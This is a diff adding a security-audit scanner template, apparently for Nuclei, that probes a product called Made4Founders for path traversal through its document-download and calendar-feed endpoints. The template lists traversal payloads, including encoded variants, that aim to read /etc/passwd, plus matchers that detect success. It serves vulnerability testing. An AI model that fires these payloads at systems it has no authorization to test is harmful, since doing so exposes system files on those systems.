@@ -1,0 +1,59 @@
+id: m4f-path-traversal
+
+info:
+  name: Made4Founders - Path Traversal
+  author: security-audit
+  severity: high
+  description: Tests for path traversal vulnerabilities in file operations
+  tags: lfi,path-traversal,m4f
+
+http:
+  # Document download path traversal
+  - raw:
+      - |
+        GET /api/documents/{{payload}}/download HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+
+    payloads:
+      payload:
+        - "../../../etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "....//....//....//etc/passwd"
+        - "..\\..\\..\\etc\\passwd"
+        - "/etc/passwd"
+        - "file:///etc/passwd"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+
+  # Calendar feed token traversal
+  - raw:
+      - |
+        GET /api/calendar/feed/{{payload}}.ics HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      payload:
+        - "../../../etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        condition: or
